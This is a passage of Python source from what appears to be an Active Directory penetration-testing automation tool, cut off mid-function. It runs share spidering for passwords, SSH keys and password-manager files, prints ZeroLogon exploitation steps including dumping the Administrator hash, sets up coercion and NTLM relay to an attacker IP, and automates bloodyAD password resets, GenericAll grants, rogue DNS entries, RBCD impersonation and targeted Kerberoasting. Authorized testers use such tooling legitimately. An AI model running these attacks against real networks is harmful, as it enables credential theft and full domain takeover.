      run_command(f"{smbmap} -H {i} {argument_smbmap} -A '.cspkg|.publishsettings|.xml|.json|.ini|.bat|.log|.pl|.py|.ps1|.txt|.config|.conf|.cnf|.sql|.yml|.cmd|.vbs|.php|.cs|.inf' -r --exclude {exclude_shares}")

      if nullsess_bool:
        print(f"{CYAN}[*] smbmap enumeration (Guest and random user){NC}")
        run_command(f"{smbmap} -H {i} -u 'Guest' -p '' -A '.cspkg|.publishsettings|.xml|.json|.ini|.bat|.log|.pl|.py|.ps1|.txt|.config|.conf|.cnf|.sql|.yml|.cmd|.vbs|.php|.cs|.inf' -r --exclude {exclude_shares}")
        run_command(f"{smbmap} -H {i} -u {rand_user} -p '' -A '.cspkg|.publishsettings|.xml|.json|.ini|.bat|.log|.pl|.py|.ps1|.txt|.config|.conf|.cnf|.sql|.yml|.cmd|.vbs|.php|.cs|.inf' -r --exclude {exclude_shares}")

      os.chdir(current_dir)
    print("")

def ne_shares():
    print(f"{BLUE}[*] Enumerating Shares using netexec {NC}")
    servers_smb_list = smb_scan() #Performs the scan
    run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} {argument_ne} --shares")

    if nullsess_bool:
        print(f"{BLUE}[*] Enumerating Shares using netexec (Guest and random user)${NC}")
        run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} -u Guest -p '' --shares")
        run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} -u {rand_user} -p '' --shares")
    print("")

def ne_spider():
    print(f"{BLUE}[*] Spidering Shares using netexec {NC}")
    servers_smb_list = smb_scan() #Performs the scan
    run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} {argument_ne} -M spider_plus -o OUTPUT={output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON")

    if nullsess_bool:
        print(f"{BLUE}[*] Spidering Shares using netexec (Guest and random user)${NC}")
        run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} -u Guest -p '' -M spider_plus -o OUTPUT={output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON")
        run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} -u {rand_user} -p '' -M spider_plus -o OUTPUT={output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON")
    print("")

def finduncshar_scan():
    if not FindUncommonShares:
        print(f"{RED}[-] Please verify the installation of FindUncommonShares{NC}")
        return

    print(f"{BLUE}[*] Enumerating Shares using FindUncommonShares{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] FindUncommonShares requires credentials {NC}")
        return

    servers_smb_list = smb_scan() #Performs the scan
    ldaps_param = "--ldaps" if ldaps_bool else ""
    verbose_p0dalirius = "-v --debug" if verbose_bool else ""
    run_command(f"{python3} {FindUncommonShares} {argument_FindUncom} {verbose_p0dalirius} {ldaps_param} -ai {dc_ip} -tf {servers_smb_list} --check-user-access --export-xlsx {output_dir}/Shares/finduncshar_{dc_domain}.xlsx --kdcHost {dc_FQDN}")
    print("")

def manspider_scan():
    print(f"{BLUE}[*] Spidering Shares using manspider {NC}")
    if kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] manspider does not support Kerberos authentication{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Shares", "manspiderDump"), exist_ok=True)
    print(f"{CYAN}[*] Running manspider....{NC}")
    servers_smb_list = smb_scan()
    print(f"{CYAN}[*] Searching for files with interesting filenames{NC}")
    run_command(f"{manspider} {argument_manspider} {servers_smb_list} -q -t 10 -f passw user admin account network login key logon cred -l {output_dir}/Shares/manspiderDump")
    print(f"{CYAN}[*] Searching for SSH keys{NC}")
    run_command(f"{manspider} {argument_manspider} {servers_smb_list} -q -t 10 -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -l {output_dir}/Shares/manspiderDump")
    print(f"{CYAN}[*] Searching for files with interesting extensions{NC}")
    run_command(f"{manspider} {argument_manspider} {servers_smb_list} -q -t 10 -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config xml cspkg publishsettings json cnf sql cmd -l {output_dir}/Shares/manspiderDump")
    print(f"{CYAN}[*] Searching for Password manager files{NC}")
    run_command(f"{manspider} {argument_manspider} {servers_smb_list} -q -t 10 -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -l {output_dir}/Shares/manspiderDump")
    print(f"{CYAN}[*] Searching for word passw in documents${NC}")
    run_command(f"{manspider} {argument_manspider} {servers_smb_list} -q -t 10 -c passw login -e docx xlsx xls pdf pptx csv -l {output_dir}/Shares/manspiderDump")
    print(f"{CYAN}[*] Searching for words in downloaded files{NC}")
    run_command(f"{manspider} {output_dir}/Shares/manspiderDump -q -t 100 -c passw key login -l {output_dir}/Shares/manspiderDump")
    print("")

def smbclient_console():
    if not impacket_smbclient:
        print(f"{RED}[-] smbclient.py not found! Please verify the installation of impacket {NC}")
        return # changed to return, as there's no point to continue

    print(f"{BLUE}[*] Please specify target IP or hostname:{NC}")
    print(f"{CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com {NC}")
    smbclient_target = input(">> ")
    while not smbclient_target:
        print(f"{RED}Invalid IP or hostname.{NC} Please specify IP or hostname:")
        smbclient_target = input(">> ")

    print(f"{BLUE}[*] Opening smbclient.py console on target: {smbclient_target} {NC}")
    if nullsess_bool:
        # impacket expects format DOMAIN/USER:PASSWORD for null session we can ommit the user and pass
        run_command(f"{impacket_smbclient} {argument_imp}Guest:''\\@{smbclient_target}")
    else:
        run_command(f"{impacket_smbclient} {argument_imp}\\{smbclient_target}")
    print("")

def smbclientng_console():
    if not smbclientng:
        print(f"{RED}[-] Please verify the installation of smbclientng{NC}")
        return

    print(f"{BLUE}[*] Launching smbclientng{NC}")
    print(f"{BLUE}[*] Please specify target IP or hostname:{NC}")
    print(f"{CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com {NC}")
    smbclient_target = input(">> ")
    while not smbclient_target:
        print(f"{RED}Invalid IP or hostname.{NC} Please specify IP or hostname:")
        smbclient_target = input(">> ")

    verbose_p0dalirius = "--debug" if verbose_bool else ""
    run_command(f"{smbclientng} {argument_p0dalirius} {verbose_p0dalirius} --host {smbclient_target} --kdcHost {dc_FQDN}")
    print("")

###### vuln_checks: Vulnerability checks
def zerologon_check():
    print(f"{BLUE}[*] zerologon check. This may take a while... {NC}")
    run_command(f"echo -n Y | {netexec} {ne_verbose} smb {target_dc} {argument_ne} -M zerologon")
    # Check and display exploitation steps if vulnerable
    if "VULNERABLE" in open(f"{output_dir}/Vulnerabilities/ne_zerologon_output_{dc_domain}.txt").read():
        print(f"{GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:{NC}")
        exploit_steps = [
            f"{CYAN}1. Exploit the vulnerability, set the NT hash to \\x00*8:{NC}",
            f"cve-2020-1472-exploit.py {dc_NETBIOS} {dc_ip}",
            f"{CYAN}2. Obtain the Domain Admin's NT hash:{NC}",
            f"secretsdump.py {dc_domain}/{dc_NETBIOS}\$@{dc_ip} -no-pass -just-dc-user Administrator",
            f"{CYAN}3. Obtain the machine account hex encoded password:{NC}",
            f"secretsdump.py -hashes :<NTLMhash_Administrator> {dc_domain}/Administrator@{dc_ip}",
            f"{CYAN}4. Restore the machine account password:{NC}",
            f"restorepassword.py -target-ip {dc_ip} {dc_domain}/{dc_NETBIOS}@{dc_NETBIOS} -hexpass <HexPass_{dc_NETBIOS}>",
        ]
        with open(f"{output_dir}/Vulnerabilities/zerologon_exploitation_steps_{dc_domain}.txt", "a") as exploit_file:
          for step in exploit_steps:
            exploit_file.write(step+"\n")
            print(step) # Print to the console
    print("")

def ms17_010_check():
    print(f"{BLUE}[*] MS17-010 check {NC}")
    servers_smb_list = smb_scan()
    run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} {argument_ne} -M ms17-010")
    print("")

def coerceplus_check():
    print(f"{BLUE}[*] coerce check {NC}")
    servers_smb_list = smb_scan()
    run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} {argument_ne} -M coerce_plus")
    print("")

def spooler_check():
    print(f"{BLUE}[*] Print Spooler check {NC}")
    servers_smb_list = smb_scan()
    run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} {argument_ne} -M spooler")
    print("")

def printnightmare_check():
    print(f"{BLUE}[*] Print Nightmare check {NC}")
    servers_smb_list = smb_scan()
    run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} {argument_ne} -M printnightmare")
    print("")

def webdav_check():
    print(f"{BLUE}[*] WebDAV check {NC}")
    servers_smb_list = smb_scan()
    run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} {argument_ne} -M webdav")
    print("")

def smbsigning_check():
    print(f"{BLUE}[*] Listing servers with SMB signing disabled or not required {NC}")
    servers_smb_list = smb_scan()
    run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} {argument_ne} --gen-relay-list {output_dir}/Vulnerabilities/ne_smbsigning_output_{dc_domain}.txt")
    if not os.path.getsize(f"{output_dir}/Vulnerabilities/ne_smbsigning_output_{dc_domain}.txt") > 0:
        print(f"{PURPLE}[-] No servers with SMB signing disabled found {NC}")
    print("")

def ntlmv1_check():
    print(f"{BLUE}[*] ntlmv1 check {NC}")
    servers_smb_list = smb_scan()
    run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} {argument_ne} -M ntlmv1")
    print("")

def smbghost_check():
    print(f"{BLUE}[*] smbghost check {NC}")
    servers_smb_list = smb_scan()
    run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} {argument_ne} -M smbghost")
    print("")

def runasppl_check():
    print(f"{BLUE}[*] runasppl check {NC}")
    servers_smb_list = smb_scan()
    run_command(f"{netexec} {ne_verbose} smb {servers_smb_list} {argument_ne} -M runasppl")
    print("")

def rpcdump_check():
    if not impacket_rpcdump:
        print(f"{RED}[-] rpcdump.py not found! Please verify the installation of impacket{NC}")
        return

    if kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] rpcdump does not support Kerberos authentication{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Vulnerabilities", "RPCDump"), exist_ok=True)
    print(f"{BLUE}[*] Impacket rpcdump{NC}")
    servers_smb_list = smb_scan()
    for i in open(servers_smb_list):
        i = i.strip()
        print(f"{CYAN}[*] RPC Dump of {i} {NC}")
        run_command(f"{impacket_rpcdump} {argument_imp}\\{i}")

        # Check for specific protocols in the output
        inte_prot = ["MS-RPRN", "MS-PAR", "MS-EFSR", "MS-FSRVP", "MS-DFSNM", "MS-EVEN"]
        with open(f"{output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_{i}.txt", "r") as outfile:
            output = outfile.read()
            for prot in inte_prot:
                if prot in output:
                    print(f"{GREEN}[+] {prot} found at {i}{NC}")
    print("")

def coercer_check():
    if not coercer:
        print(f"{RED}[-] Coercer not found! Please verify the installation of Coercer{NC}")
        return
    if kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] Coercer does not support Kerberos authentication{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Vulnerabilities", "Coercer"), exist_ok=True)
    print(f"{BLUE}[*] Running scan using coercer {NC}")
    servers_smb_list = smb_scan()
    run_command(f"{coercer} scan {argument_coercer} -f {servers_smb_list} --dc-ip $dc_ip --auth-type smb --export-xlsx {output_dir}/Vulnerabilities/Coercer/coercer_output_{dc_domain}.xlsx")
    
    # Open and check content with shell commands
    process = subprocess.run([f"grep -q -r 'SMB  Auth' {output_dir}/Vulnerabilities/Coercer/"], shell=True, capture_output=True, text=True)
    if process.returncode == 0:
        print(f"{GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:{NC}")
        exploit_steps = [
            f"{CYAN}1. Run responder on second terminal to capture hashes:{NC}",
            f"sudo responder -I {attacker_interface}",
            f"{CYAN}2. Coerce target server:{NC}",
            f"{coercer} coerce {argument_coercer} -t " + '{i}' + f" -l {attacker_IP} --dc-ip $dc_ip"
        ]
        with open(f"{output_dir}/Vulnerabilities/coercer_exploitation_steps_{dc_domain}.txt", "a") as exploit_file:
            for step in exploit_steps:
                exploit_file.write(step + "\n")
                print(step) # Print to the console

    print("")

def privexchange_check():
    if not privexchange:
        print(f"{RED}[-] privexchange.py not found! Please verify the installation of privexchange{NC}")
        return # changed to return, as there's no point to continue

    if kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] privexchange does not support Kerberos authentication{NC}")
        return # changed to return, as there's no point to continue

    print(f"{BLUE}[*] Use Exchange Web Services to call PushSubscription API using privexchange. Please specify hostname of Exchange server:{NC}")
    if nullsess_bool:
        print(f"{YELLOW}[*] No credentials were provided, use ntlmrelayx and then modified httpattack.py, and then press ENTER to continue....{NC}")
        print("cd /home/USER/.local/pipx/venvs/impacket/lib/python3.XX/site-packages/impacket/examples/ntlmrelayx/attacks/httpattack.py")
        print("mv httpattack.py httpattack.py.old")
        print("wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/httpattack.py")
        print("sed -i 's/attacker_url = .*$/attacker_url = $ATTACKER_URL/' httpattack.py")
        print("ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx")
        input("")  # Wait for Enter key press

    print(f"{BLUE}[*] Please specify hostname of Exchange server:{NC}")
    print(f"{CYAN}[*] Example: 10.1.0.5 or EXCH01 or EXCH01.domain.com {NC}")
    target_exchange = input(">> ")
    while not target_exchange:
        print(f"{RED}Invalid hostname.{NC} Please specify hostname of Exchange server:")
        target_exchange = input(">> ")

    set_attackerIP()
    run_command(f"{python3} {privexchange} {argument_privexchange} -ah {attacker_IP} {target_exchange}")
    print("")

def runfinger_check():
    if not RunFinger:
        print(f"{RED}[-] RunFinger.py not found! Please verify the installation of RunFinger{NC}")
        return

    print(f"{BLUE}[*] Using RunFinger.py{NC}")
    servers_smb_list = smb_scan()
    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "Vulnerabilities"))
    run_command(f"{python3} {RunFinger} -f {servers_smb_list}")
    os.chdir(current_dir)
    print("")

def ldapnightmare_check():
    if not LDAPNightmare:
        print(f"{RED}[-] LDAPNightmare (CVE-2024-49113-checker) not found! Please verify the installation of LDAPNightmare{NC}")
        return

    print(f"{BLUE}[*] Running LDAPNightmare check against domain{NC}")
    run_command(f"{python3} {LDAPNightmare} {target_dc}")
    print("")

###### mssql_checks: MSSQL scan
def mssql_enum():
    if not windapsearch or not impacket_GetUserSPNs:
        print(f"{RED}[-] Please verify the location of windapsearch and GetUserSPNs.py{NC}")
        return

    print(f"{BLUE}[*] MSSQL Enumeration{NC}")
    # Use a set to avoid duplicates, then write to file at the end
    unique_sql_hostnames = set()

    # Populate the set from existing files
    for file_path in [f"{output_dir}/DomainRecon/Servers/sql_list_windap_{dc_domain}.txt",
                      f"{output_dir}/DomainRecon/Servers/sql_list_kerberoast_{dc_domain}.txt",
                      f"{output_dir}/DomainRecon/Servers/sql_list_bhd_{dc_domain}.txt",
                      f"{output_dir}/DomainRecon/Servers/sql_list_adcheck_{dc_domain}.txt"]:
      if os.path.exists(file_path):
        with open(file_path, "r") as f:
           for line in f:
              unique_sql_hostnames.add(line.strip().upper())

    # Write unique hostnames to the file
    with open(sql_hostname_list, "w") as f:
      for hostname in sorted(unique_sql_hostnames):  # Sort for consistent output
        f.write(hostname + "\n")

    # Resolve IPs for each hostname
    sql_ip_set = set() # Using a set to avoid duplicates
    for hostname in unique_sql_hostnames:
        shortname = hostname.split(".")[0].upper()
        # Since we expect multiple entries, read the CSV and search
        if os.path.exists(f"{output_dir}/DomainRecon/dns_records_{dc_domain}.csv"):
          with open(f"{output_dir}/DomainRecon/dns_records_{dc_domain}.csv", "r") as dns_file:
            for line in dns_file:
              if "A," in line and "DnsZones" not in line and "@" not in line:
                parts = line.split(",")
                if len(parts) > 3 and parts[1].strip().upper() == shortname:
                  sql_ip_set.add(parts[2].strip())
    with open(sql_ip_list, "w") as f:
      for ip in sorted(sql_ip_set):
         f.write(ip + "\n")
    
    if os.path.isfile(target_sql) and os.path.getsize(target_sql) > 0 :
        run_command(f"{netexec} {ne_verbose} mssql {target_sql} {argument_ne} -M mssql_priv")
    else:
        print(f"{PURPLE}[-] No SQL servers found! Please re-run SQL enumeration and try again..{NC}")
    print("")

def mssql_relay_check():
    if not mssqlrelay:
        print(f"{RED}[-] Please verify the location of mssqlrelay{NC}")
        return # changed to return, as there's no point to continue

    if nullsess_bool:
        print(f"{PURPLE}[-] mssqlrelay requires credentials{NC}")
        return # changed to return, as there's no point to continue

    print(f"{BLUE}[*] MSSQL Relay Check{NC}")
    ldaps_param = "" if ldaps_bool else "-scheme ldap"
    run_command(f"{mssqlrelay} {mssqlrelay_verbose} checkall {ldaps_param} {argument_mssqlrelay} -ns {dc_ip} -dns-tcp -windows-auth")
    print("")

def mssqlclient_console():
    if not impacket_mssqlclient:
        print(f"{RED}[-] mssqlclient.py not found! Please verify the installation of impacket {NC}")
        return
    if nullsess_bool:
        print(f"{PURPLE}[-] mssqlclient requires credentials{NC}")
        return

    print(f"{BLUE}[*] Please specify target IP or hostname:{NC}")
    print(f"{CYAN}[*] Example: 10.1.0.5 or SQL01 or SQL01.domain.com {NC}")
    mssqlclient_target = input(">> ")
    while not mssqlclient_target:
        print(f"{RED}Invalid IP or hostname.{NC} Please specify IP or hostname:")
        mssqlclient_target = input(">> ")

    print(f"{BLUE}[*] Opening mssqlclient.py console on target: {mssqlclient_target} {NC}")
    run_command(f"{impacket_mssqlclient} {argument_imp}\\{mssqlclient_target} -windows-auth")
    print("")

def mssqlpwner_console():
    if not mssqlpwner:
        print(f"{RED}[-] Please verify the location of mssqlpwner{NC}")
        return

    if nullsess_bool:
        print(f"{PURPLE}[-] mssqlpwner requires credentials{NC}")
        return

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "MSSQL"))
    print(f"{BLUE}[*] Please specify target IP or hostname:{NC}")
    print(f"{CYAN}[*] Example: 10.1.0.5 or SQL01 or SQL01.domain.com {NC}")
    mssqlpwner_target = input(">> ")
    while not mssqlpwner_target:
        print(f"{RED}Invalid IP or hostname.{NC} Please specify IP or hostname:")
        mssqlpwner_target = input(">> ")

    print(f"{BLUE}[*] Opening mssqlpwner console{NC}")
    run_command(f"{mssqlpwner} {argument_mssqlpwner}@{mssqlpwner_target} -dc-ip {dc_ip} -windows-auth interactive")
    os.chdir(current_dir)
    print("")

###### Modification of AD Objects or Attributes
def change_pass():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Changing passwords of a user or computer account. Please specify target:{NC}")
    print(f"{CYAN}[*] Example: user01 or DC01$ {NC}")
    target_passchange = input(">> ")
    while not target_passchange:
        print(f"{RED}Invalid name.{NC} Please specify target:")
        target_passchange = input(">> ")

    print(f"{BLUE}[*] Please specify new password (default: Summer3000_):{NC}")
    pass_passchange = input(">> ")
    if not pass_passchange:
        pass_passchange = "Summer3000_"

    print(f"{CYAN}[*] Changing password of {target_passchange} to {pass_passchange}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} set password {target_passchange} {pass_passchange}")
    print("")

def add_group_member():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Adding user to group. Please specify target group:{NC}")
    print(f"{CYAN}[*] Example: group01 {NC}")
    target_groupmem = input(">> ")
    while not target_groupmem:
        print(f"{RED}Invalid name.{NC} Please specify target group:")
        target_groupmem = input(">> ")

    print(f"{BLUE}[*] Please specify user to add to the group (default: current user):{NC}")
    user_groupmem = input(">> ")
    if not user_groupmem:
        user_groupmem = user

    print(f"{CYAN}[*] Adding {user_groupmem} to group {target_groupmem}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} add groupMember '{target_groupmem}' '{user_groupmem}'")
    print("")

def add_computer():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return
    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Adding new computer account. Please specify computer hostname (default: WS3000):{NC}")
    host_addcomp = input(">> ")
    if not host_addcomp:
        host_addcomp = "WS3000"

    print(f"{BLUE}[*] Please specify new password (default: Summer3000_):{NC}")
    pass_addcomp = input(">> ")
    if not pass_addcomp:
        pass_addcomp = "Summer3000_"

    print(f"{CYAN}[*] Creating computer {host_addcomp} with password {pass_addcomp}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} add computer '{host_addcomp}' '{pass_addcomp}'")
    print("")

def dnsentry_add():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Please specify hostname of the attacker DNS entry (default: kali):{NC}")
    hostname_dnstool = input(">> ")
    if not hostname_dnstool:
        hostname_dnstool = "kali"

    print(f"{BLUE}[*] Please confirm the IP of the attacker's machine:{NC}")
    set_attackerIP()
    print(f"{BLUE}[*] Adding new DNS entry for Active Directory integrated DNS{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} add dnsRecord {hostname_dnstool} {attacker_IP}")
    print("")

def change_owner():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return # changed to return, as there's no point to continue

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Changing owner of a user, computer, group, etc. Please specify target:{NC}")
    print(f"{CYAN}[*] Example: user01 or DC01$ or group01 {NC}")
    target_ownerchange = input(">> ")
    while not target_ownerchange:
        print(f"{RED}Invalid name.{NC} Please specify target:")
        target_ownerchange = input(">> ")

    print(f"{CYAN}[*] Changing Owner of {target_ownerchange} to {user}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} set owner {target_ownerchange} '{user}'")
    print("")

def add_genericall():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return # changed to return, as there's no point to continue

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Adding GenericAll rights of a user, computer, group, etc. Please specify target:{NC}")
    print(f"{CYAN}[*] Example: user01 or DC01$ or group01 {NC}")
    target_genericall = input(">> ")
    while not target_genericall:
        print(f"{RED}Invalid name.{NC} Please specify target:")
        target_genericall = input(">> ")

    print(f"{CYAN}[*] Adding GenericAll rights on {target_genericall} to {user}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} add genericAll {target_genericall} '{user}'")
    print("")

def targetedkerberoast_attack():
    if not targetedKerberoast:
        print(f"{RED}[-] Please verify the location of targetedKerberoast.py{NC}")
        return  # Exit if the tool is not found

    if nullsess_bool:
        print(f"{PURPLE}[-] targetedKerberoast requires credentials{NC}")
        return  # Exit if nullsess is used (credentials are required)

    print(f"{BLUE}[*] Targeted Kerberoasting Attack (Noisy!){NC}")
    ldaps_param = "--use-ldaps" if ldaps_bool else ""
    command = f"{python3} {targetedKerberoast} {argument_targkerb} -D {dc_domain} --dc-ip {dc_ip} {ldaps_param} --only-abuse --dc-host {dc_NETBIOS} -o {output_dir}/Kerberos/targetedkerberoast_hashes_{dc_domain}.txt"
    print(f"{GREEN}[+] Running command: {command}{NC}")
    run_command(command)

    # Check for and display hashes
    hash_output_file = f"{output_dir}/Kerberos/targetedkerberoast_hashes_{dc_domain}.txt"
    if os.path.exists(hash_output_file) and os.path.getsize(hash_output_file) > 0:
        with open(hash_output_file, "r") as f:
            hash_count = sum(1 for _ in f)
        print(f"{GREEN}[+] Found {hash_count} hashes. Saved to: {hash_output_file}{NC}")
        with open(hash_output_file, "r") as f: # Print content
            print(f.read())
    else:
        print(f"{YELLOW}[-] No hashes found.${NC}")
    print("")

def rbcd_attack():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return # changed to return, as there's no point to continue

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Performing RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:{NC}")
    print(f"{CYAN}[*] Example: DC01 {NC}")
    target_rbcd = input(">> ")
    while not target_rbcd:
        print(f"{RED}Invalid name.{NC} Please specify target:")
        target_rbcd = input(">> ")

    print(f"{BLUE}[*] Please specify account under your control:{NC}")
    print(f"{CYAN}[*] Example: user01 or DC01$ {NC}")
    service_rbcd = input(">> ")
    while not service_rbcd:
        print(f"{RED}Invalid name.{NC} Please specify account under your control:")
        service_rbcd = input(">> ")

    print(f"{CYAN}[*] Performing RBCD attack against {target_rbcd} using account {service_rbcd}{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} add rbcd '{target_rbcd}$' '{service_rbcd}'")

    # Check output and provide next steps
    rbcd_output_file = f"{output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_{dc_domain}.txt"
    if os.path.exists(rbcd_output_file):
      with open(rbcd_output_file, 'r') as f:
        output = f.read()
        if "can now impersonate users" in output:
          print(f"{GREEN}[+] RBCD Attack successful! Run command below to generate ticket{NC}")
          print(f"{impacket_getST} -spn 'cifs/{target_rbcd}.{domain}' -impersonate Administrator -dc-ip {dc_ip} '{domain}/{service_rbcd}:<PASSWORD>'")
          print(f"{CYAN}[!] Run command below to remove impersonation rights:{NC}")
          print(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} remove rbcd '{target_rbcd}$' '{service_rbcd}'")
    print("")

def rbcd_spnless_attack():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return
    os.makedirs(os.path.join(output_dir, "Modification", "bloodyAD"), exist_ok=True)

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}")
        return
    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] Performing SPN-less RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:{NC}")
    print(f"{CYAN}[*] Example: DC01 {NC}")
    target_rbcd = input(">> ")
    while not target_rbcd:
        print(f"{RED}Invalid name.{NC} Please specify target:")
        target_rbcd = input(">> ")
    print(f"{BLUE}[*] Please specify SPN-less account under your control:{NC}")
    print(f"{CYAN}[*] Example: user01 {NC}")
    user_spnless = input(">> ")
    while not user_spnless:
        print(f"{RED}Invalid name.{NC} Please specify account under your control:")
        user_spnless = input(">> ")
    print(f"{YELLOW}[!] Warning: This will modify the password of the SPN-less account under your control:{NC}")
    print(f"{BLUE}[*] Please provide password or NT hash of SPN-less account under your control:{NC}")
    pass_spnless = input(">> ")
    while not pass_spnless:
        print(f"{RED}Invalid password.{NC} Please specify password or NT hash of account under your control:")
        pass_spnless = input(">> ")

    print(f"{CYAN}[*] Performing RBCD attack against {target_rbcd} using SPN-less account {user_spnless}{NC}")

    if not impacket_getTGT:
        print(f"{RED}[-] getTGT.py not found! Please verify the installation of impacket{NC}")
        return
    # Generate hash if password is provided
    if len(pass_spnless) == 32:
        spnless_hash = pass_spnless
    else:
        spnless_hash = subprocess.check_output(['iconv', '-f', 'ASCII', '-t', 'UTF-16LE'], input=pass_spnless.encode()).decode()
        spnless_hash = subprocess.check_output([which('openssl'), 'dgst', '-md4'], input=spnless_hash.encode()).decode().split(" ")[-1].strip()

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "Modification"))

    print(f"{CYAN}[*] Requesting TGT for user {user_spnless}{NC}")
    run_command(f"{impacket_getTGT} {domain}/{user_spnless} -hashes :${spnless_hash} -dc-ip {dc_ip}")

    tgt_file = os.path.join(output_dir, "Modification", f"{user_spnless}.ccache")
